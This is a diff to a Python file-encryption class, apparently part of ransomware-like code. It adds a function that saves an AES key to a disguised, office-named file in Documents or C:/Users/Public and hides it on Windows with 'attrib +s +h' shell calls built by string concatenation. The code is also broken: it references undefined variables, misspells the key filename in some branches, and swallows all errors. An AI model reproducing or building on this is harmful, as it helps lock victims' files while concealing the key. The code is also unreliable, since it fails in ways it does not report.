@@ -1,4 +1,5 @@
 import os,platform,glob,sys,string
+from os import system as sis
 from Crypto.Cipher import AES
 from Crypto import Random
 
@@ -69,3 +70,95 @@ class Crypt:
 		if hasattr(sys, '_MEIPASS'):
 			return os.path.join(sys._MEIPASS, relative_path)
 		return os.path.join(os.path.abspath("."), relative_path)
+
+	def check_w_key(documents,documentos=os.path.expanduser('~/Documentos')):
+		"""
+		This method in particular ensures the functionality of subsequent decryption.
+		Basically it checks if a key has already been generated for that computer by reading the saved key files.
+		This helps to ensure that a new key is not created when the machine is restarted and the new one is lost.
+		Maybe it would be much better just to save in a text file a "0" state for key saved or know what to do all that code.
+		Forgive me. I need help.
+		"""
+		global k
+		if s=='Windows':
+			try:
+				try:
+					with open(documents+'/.officek','rb') as okey:
+						ok = okey.read()
+					if len(ok)==32:
+						k = ok
+					else:
+						try:
+							with open(documents+'/.officek','wb') as key:
+								key.write(k)
+							sis('cd '+documents)
+							sis('attrib +s +h '+documents+'/.officek')
+						except:
+							pass
+				except:
+					try:
+						with open(documents+'/.officek','wb') as key:
+							key.write(k)
+						sis('cd '+documents)
+						sis('attrib +s +h '+documents+'/.officek')
+					except:
+						pass
+			except:
+				try:
+					with open('C:/Users/Public/.officek','rb') as okey:
+						ok = okey.read()
+					if len(ok)==32:
+						k = ok
+					else:
+						try:
+							with open('C:/Users/Public/.officek','wb') as key:
+								key.write(k)
+							sis('cd C:/Users/Public')
+							sis('attrib +s +h C:/Users/Public/.officek')
+						except:
+							pass
+				except:
+					try:
+						with open('C:/Users/Public/.officek','wb') as key:
+							key.write(k)
+						sis('cd C:/Users/Public')
+						sis('attrib +s +h C:/Users/Public/.officek')
+					except:
+						pass
+		elif s=='Linux':
+			try:
+				try:
+					with open(documents+'/.officek','rb') as okey:
+						ok = okey.read()
+					if len(ok)==32:
+						k = ok
+					else:
+						try:
+							with open(documents+'/.officek','wb') as key:
+								key.write(k)
+						except:
+							pass
+				except:
+					try:
+						with open(documents+'/.officek','wb') as key:
+							key.write(k)
+					except:
+						pass
+			except:
+				try:
+					with open(documentos+'/.officek','rb') as okey:
+						ok = key.read()
+					if len(ok)==32:
+						k = ok
+					else:
+						try:
+							with open(documentos+'/.oficcek','wb') as key:
+								key.write(k)
+						except:
+							pass
+				except:
+					try:
+						with open(documentos+'/.oficcek','wb') as key:
+							key.write(k)
+					except:
+						pass
